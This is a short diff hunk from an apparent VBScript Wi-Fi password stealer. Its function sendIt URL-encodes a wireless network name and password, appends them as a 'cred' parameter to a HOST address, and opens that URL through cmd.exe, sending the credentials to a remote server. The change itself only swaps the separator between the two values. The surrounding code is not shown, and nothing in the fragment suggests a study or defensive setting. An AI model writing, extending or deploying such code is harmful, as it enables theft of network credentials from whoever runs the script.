@@ -22,7 +22,7 @@ Function sendIt(hostname, wireless, passwd)
   Set request = WScript.CreateObject("WScript.SHell")
   PASS = "[uri]::EscapeDataString('" & passwd & "')"
   WIFI = "[uri]::EscapeDataString('" & wireless & "')"
-  URL = HOST & "?cred=" & GetOutput(WIFI) & "_" & GetOutput(PASS)
+  URL = HOST & "?cred=" & GetOutput(WIFI) & "," & GetOutput(PASS)
   request.run "cmd.exe /C start " & URL
   WScript.Sleep 1000
 End Function
